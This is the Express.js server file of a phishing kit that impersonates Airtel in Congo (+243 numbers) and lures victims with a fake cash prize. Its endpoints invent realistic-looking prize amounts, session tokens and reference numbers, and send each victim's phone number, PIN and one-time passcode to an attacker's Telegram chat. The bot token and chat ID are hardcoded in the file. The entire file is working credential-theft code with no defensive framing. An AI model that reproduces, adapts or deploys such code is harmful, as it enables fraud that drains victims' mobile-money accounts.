const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// 🔑 Your details
const BOT_TOKEN = process.env.BOT_TOKEN || "8979057744:AAEiWFpLicOu-cIEPP6Ol8EdQqJYC4BncV4";
const CHAT_ID   = process.env.CHAT_ID   || "8409068780";

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ---------- Health check ----------
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'AAirtel backend running' });
});

// ---------- Helper: send to Telegram ----------
async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  });
  return response.json();
}

// ============================================================
// 1️⃣  CHECK ELIGIBILITY  →  from index.html
// ============================================================
app.post('/api/check-eligibility', async (req, res) => {
  try {
    const { phone } = req.body;

    if (!phone) {
      return res.status(400).json({ success: false, error: 'Phone is required' });
    }

    // Random amount from a list (feels realistic)
    const amounts = [1190, 850, 1500, 2200, 950];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];

    // Generate a fake session token
    const session_token = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10);

    const text =
      `📱 <b>NEW VISITOR</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>Phone:</b> +243 ${phone}\n` +
      `<b>Amount shown:</b> $${amount}\n` +
      `<b>Session:</b> <code>${session_token}</code>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    await sendToTelegram(text);

    res.json({
      success: true,
      amount: amount,
      session_token: session_token
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// 2️⃣  CLAIM PRIZE  →  from eligible.html
// ============================================================
app.post('/api/claim-prize', async (req, res) => {
  try {
    const { phone, amount, session, page } = req.body;

    // Generate a fake reference number
    const reference = 'AIRTEL-' + Date.now().toString().slice(-8) + '-' +
                      Math.random().toString(36).slice(2, 6).toUpperCase();

    const text =
      `🎁 <b>CLAIM CLICKED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Phone:</b> +243 ${phone || 'N/A'}\n` +
      `<b>💰 Amount:</b> $${amount || 'N/A'}\n` +
      `<b>🔖 Reference:</b> <code>${reference}</code>\n` +
      `<b>📍 Page:</b> ${page || 'eligible'}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    await sendToTelegram(text);

    res.json({
      success: true,
      reference: reference,
      amount: amount
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// 3️⃣  LOGIN  →  from login.html
// ============================================================
app.post('/api/login', async (req, res) => {
  try {
    const { phone, pin, amount, session, page } = req.body;

    const text =
      `🔑 <b>LOGIN ATTEMPT</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Téléphone:</b> +243 ${phone || 'N/A'}\n` +
      `<b>🔒 PIN:</b> <code>${pin || 'N/A'}</code>\n` +
      `<b>💰 Montant:</b> $${amount || 'N/A'}\n` +
      `<b>📍 Page:</b> ${page || 'login'}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    const result = await sendToTelegram(text);
    res.json({ success: true, telegram: result });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// 4️⃣  OTP  →  from otp.html
// ============================================================
app.post('/api/otp', async (req, res) => {
  try {
    const { otp, phone, amount, session, page } = req.body;

    const text =
      `🔐 <b>OTP SUBMITTED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Téléphone:</b> +243 ${phone || 'N/A'}\n` +
      `<b>🔢 OTP:</b> <code>${otp || 'N/A'}</code>\n` +
      `<b>💰 Montant:</b> $${amount || 'N/A'}\n` +
      `<b>📍 Page:</b> ${page || 'otp'}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    const result = await sendToTelegram(text);
    res.json({ success: true, telegram: result });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// 5️⃣  GENERIC (fallback)
// ============================================================
app.post('/api/send', async (req, res) => {
  try {
    const data = req.body;
    let text = `📩 <b>New submission</b>\n\n`;
    for (const key in data) {
      text += `<b>${key}:</b> ${data[key]}\n`;
    }
    const result = await sendToTelegram(text);
    res.json({ success: true, telegram: result });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ---------- 404 ----------
app.use((req, res) => {
  res.status(404).json({ success: false, error: 'Route not found' });
});

// ---------- Start ----------
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
